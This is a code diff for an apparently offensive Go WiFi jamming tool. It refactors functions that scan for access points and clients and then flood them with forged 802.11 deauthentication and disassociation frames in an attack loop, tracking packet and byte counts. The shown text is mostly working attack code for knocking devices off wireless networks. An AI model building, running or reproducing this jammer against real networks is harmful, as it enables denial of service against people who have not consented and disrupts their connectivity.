@@ -122,7 +122,6 @@ func	(conn *JamConn)	SetDeviceFreq(freq layers.RadioTapChannelFrequency) error {
 	return nil
 }
 
-
 func	(conn *JamConn)	SendScanAbort() error {
 
 	encoder := netlink.NewAttributeEncoder()
@@ -297,6 +296,7 @@ func	(conn *JamConn)	SetIfaType(ifaType uint32) error {
 }
 
 func	(conn *JamConn) DoAPScan(apWList *List, apList *List) (err error) {
+
 	if err := conn.SetIfaType(nl80211.IFTYPE_STATION); err != nil {
 		return errors.New("JamConn.SetIfaType() " + err.Error())
 	}
@@ -336,10 +336,10 @@ func	(conn *JamConn) DoAPScan(apWList *List, apList *List) (err error) {
 	return nil
 }
 
-func	(conn *JamConn)	DoAPScanIfPast(timeout time.Duration, APWList *List, APTargList *List) {
+func	(conn *JamConn)	DoAPScanIfPast(timeout time.Duration, apWList *List, apList *List) {
 
 	if time.Since(conn.lastAPScan) > timeout {
-		if err := conn.DoAPScan(APWList, APTargList); err != nil {
+		if err := conn.DoAPScan(apWList, apList); err != nil {
 			log.Fatalln("JamConn.DoAPScan() " + err.Error())
 		}
 	}
@@ -359,7 +359,7 @@ func	(conn *JamConn) AttackIfPast(timeout time.Duration, count uint16, apList *L
 			}
 			for _, cli := range ap.clients {
 				//Previous authentication no longer valid.
-				bSent, err := conn.Deauthenticate(
+				nPkt, nByte, err := conn.Deauthenticate(
 					count, 0x2,
 					ap.hwaddr, cli.hwaddr,
 					ap.tap, ap.dot)
@@ -371,15 +371,15 @@ func	(conn *JamConn) AttackIfPast(timeout time.Duration, count uint16, apList *L
 						log.Panicln("JamConn.Deauthenticate() " + err.Error())
 					}
 				}
-				StatsG.nByteTx += uint64(bSent)
-				StatsG.nPktTx += uint64(count)
-				StatsG.nDeauth += uint32(count)
-				ap.nDeauth += uint32(count)
-				cli.nDeauth += uint32(count)
-				bSent, err = conn.Disassociate(
-					count, 0x2,
-					ap.hwaddr, cli.hwaddr,
-					ap.tap, ap.dot)
+				StatsG.nByteTx += uint64(nByte)
+				StatsG.nPktTx += uint64(nPkt)
+				StatsG.nDeauth += uint32(nPkt)
+				ap.nDeauth += uint32(nPkt)
+				cli.nDeauth += uint32(nPkt)
+				nPkt, nByte, err = conn.Disassociate(
+					count, layers.Dot11ReasonDisasStLeaving,
+					cli.hwaddr, ap.hwaddr,
+					cli.tap, cli.dot)
 				if err != nil {
 					if err.Error() == "send: Bad file descriptor" {
 						QuitG = true
@@ -388,14 +388,14 @@ func	(conn *JamConn) AttackIfPast(timeout time.Duration, count uint16, apList *L
 						log.Panicln("JamConn.Deauthenticate() " + err.Error())
 					}
 				}
-				StatsG.nByteTx += uint64(bSent)
-				StatsG.nPktTx += uint64(count)
-				StatsG.nDisassc += uint32(count)
-				ap.nDisassc += uint32(count)
-				cli.nDisassc += uint32(count)
-				ApListMutexG.Lock()
-				apList.Add(ap.hwaddr.String()[:16], ap)
-				ApListMutexG.Unlock()
+				StatsG.nByteTx += uint64(nByte)
+				StatsG.nPktTx += uint64(nPkt)
+				StatsG.nDisassc += uint32(nPkt)
+				ap.nDisassc += uint32(nPkt)
+				cli.nDisassc += uint32(nPkt)
+				APListMutexG.Lock()
+				apList.Add(apKey(ap.hwaddr.String()), ap)
+				APListMutexG.Unlock()
 			}
 		}
 		conn.SetLastDeauth(time.Now())
@@ -433,13 +433,13 @@ func	createDot11Header(
 func	(conn *JamConn)	Deauthenticate(
 			count uint16, reason layers.Dot11Reason,
 			src net.HardwareAddr, dst net.HardwareAddr,
-			tap layers.RadioTap, dot11Orig layers.Dot11) (nBytes uint32, err error) {
+			tap layers.RadioTap, dot11Orig layers.Dot11) (nPkts uint32, nBytes uint32, err error) {
 
 	var i			uint16
 	var opts		gopacket.SerializeOptions
 	var buff		gopacket.SerializeBuffer
-	var bSent		uint32
-
+	var nByte		uint32
+	var nPkt		uint32
 
 	opts.ComputeChecksums = true
 	opts.FixLengths = true
@@ -453,29 +453,31 @@ func	(conn *JamConn)	Deauthenticate(
 	for i = 0; i < count; i++ {
 		buff = gopacket.NewSerializeBuffer()
 		if err := gopacket.SerializeLayers(buff, opts, &tap, &dot11, &mgmt); err != nil {
-			return bSent, err
+			return nPkt, nByte, err
 		}
 		if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
 			if err.Error() == "send: Resource temporarily unavailable" {
-				return 0, nil
+				return nPkt, nByte, nil
 			}
-			return bSent, err
+			return nPkt, nByte, err
 		}
-		bSent += uint32(len(buff.Bytes()))
+		nPkt += 1
+		nByte += uint32(len(buff.Bytes()))
 		dot11.SequenceNumber += 1
 	}
-	return bSent, nil
+	return nPkt, nByte, nil
 }
 
 func	(conn *JamConn)	Disassociate(
 	count uint16, reason layers.Dot11Reason,
 	src net.HardwareAddr, dst net.HardwareAddr,
-	tap layers.RadioTap, dot11Orig layers.Dot11) (nBytes uint32, err error) {
+	tap layers.RadioTap, dot11Orig layers.Dot11) (nPkts uint32, nBytes uint32, err error) {
 
 	var i			uint16
 	var opts		gopacket.SerializeOptions
 	var buff		gopacket.SerializeBuffer
-	var bSent		uint32
+	var nByte		uint32
+	var nPkt		uint32
 
 	opts.ComputeChecksums = true
 	opts.FixLengths = true
@@ -489,18 +491,19 @@ func	(conn *JamConn)	Disassociate(
 	for i = 0; i < count; i++ {
 		buff = gopacket.NewSerializeBuffer()
 		if err := gopacket.SerializeLayers(buff, opts, &tap, &dot11, &mgmt); err != nil {
-			return bSent, err
+			return nPkt, nByte, err
 		}
 		if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
 			if err.Error() == "send: Resource temporarily unavailable" {
-				return 0, nil
+				return nPkt, nByte, nil
 			}
-			return bSent, err
+			return nPkt, nByte, err
 		}
-		bSent += uint32(len(buff.Bytes()))
+		nPkt += 1
+		nByte += uint32(len(buff.Bytes()))
 		dot11.SequenceNumber += 1
 	}
-	return bSent, nil
+	return nPkt, nByte, nil
 }
 
 
@@ -510,6 +513,7 @@ func	(conn* JamConn)	TriggerScan() (bool, error) {
 	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
 	// wildcard scan
 	encoder.Bytes(nl80211.ATTR_SCAN_SSIDS, []byte(""))
+
 	attribs, err := encoder.Encode()
 	if err != nil {
 		return false, errors.New("genetlink.Encoder.Encode() " + err.Error())
@@ -527,7 +531,6 @@ func	(conn* JamConn)	TriggerScan() (bool, error) {
 		return false, errors.New("genetlink.Conn.Send() " + err.Error())
 	}
 	done := false
-	//scanStart := time.Now()
 	for !done {
 		msgs, _, err := conn.nlconn.Receive()
 		if err != nil {
@@ -548,10 +551,5 @@ func	(conn* JamConn)	TriggerScan() (bool, error) {
 			}
 		}
 	}
-	//if !done {
-	//	if err := conn.SendScanAbort(); err != nil {
-	//		return false, errors.New("JamConn.SendScanAbort() " + err.Error())
-	//	}
-	//}
 	return true, nil
 }
